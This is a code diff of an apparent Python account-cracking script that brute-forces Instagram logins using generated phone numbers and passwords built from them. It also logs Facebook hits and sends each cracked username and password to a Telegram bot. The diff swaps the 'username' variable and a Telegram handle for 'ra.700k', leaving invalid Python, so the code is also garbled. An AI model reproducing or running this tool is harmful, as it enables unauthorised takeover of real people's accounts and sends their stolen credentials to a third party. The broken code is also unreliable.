@@ -23,7 +23,7 @@ except:
 try:
     from user_agent import generate_user_agent
 except:
-    os.system('pip install user_agent ')
+    os.system('pip install ra.700k_agent ')
 
 try:
     from datetime import datetime
@@ -147,7 +147,7 @@ else:
                     ss+=1
                     
                     with open('hit-facbook.txt', 'a') as (weaver):
-                        weaver.write('{}:{}\n'.format(username, password))
+                        weaver.write('{}:{}\n'.format(ra.700k, password))
                 else:
                     print(Z + ' Email ==> : ' + weavermil + ': pass ==> : ' + weaverps)
                     bb+=1
@@ -248,7 +248,7 @@ if TOOLS == '3':
             while True:
                 user = '0123456789'
                 us = str(''.join((random.choice(user) for i in range(8))))                
-                username = '+96477' + us
+                username = '+ra.700k' + us
                 password = '077' + us
                 url = 'https://www.instagram.com/api/v1/accounts/login/'
                 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
@@ -259,7 +259,7 @@ if TOOLS == '3':
                  'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                  'Host':'i.instagram.com'}
                 uid = str(uuid4())
-                data = {'uuid':uid,  'password':password,  'username':username, 
+                data = {'uuid':uid,  'password':password,  'username':ra.700k, 
                  'device_id':uid, 
                  'from_reg':'false', 
                  '_csrftoken':'missing', 
@@ -270,21 +270,21 @@ if TOOLS == '3':
                     ht += 1                    
                     tlg = (f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ 𝙷𝙸𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 ⌯
 . — — — — —  — — — — — . 
-⌯ ᴇᴍᴀɪʟ : {username}
+⌯ ᴇᴍᴀɪʟ : {ra.700k}
 ⌯ ᴘᴀѕѕ : {password}
 . — — — — —  — — — — —
-• Tele : @vip2i2 ,  @T_F_U
+• Tele : @ra.700k ,  @T_F_U
   ''' )
                     i = requests.post(tlg)
                     with open('insta-hits.txt', 'a') as (HACKED):
                         HACKED.write('{}:{}\n'.format(username, password))
                 elif '"message":"challenge_required","challenge"' in req_login.text:
                     
-                    print (X+'user : ' +username+ ' | pass : '+password)
+                    print (X+'ra.700k : ' +ra.700k+ ' | pass : '+password)
                     sr+=1
                 else:
                     requests.post(f"https://api.telegram.org/bot"+str(tok)+"/editmessagetext?chat_id="+str(ID)+"&message_id="+str(id_msg)+"&text=\n- 𝙷𝙸𝙽𝙴𝚆 ＦＢＩ 𝙷𝚊𝙲𝚔 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 \n.— — — — —  — — — — — . \n⌯  𝙷𝚊𝚌𝚔 : "+str(ht)+"\n⌯  𝙱𝙰𝙳 : "+str(bd)+"\n⌯  𝚂𝙴𝙲𝙾𝚁 : "+str(sr)+"\n. — — — — —  — — — — — .\n• Tele : @vip2i2  ,  @T_F_U")
-                    print (Z+'user : ' +username+ ' | pass : '+password)
+                    print (Z+'user : ' +ra.700k+ ' | pass : '+password)
                     bd+=1                          
                                                     
                       
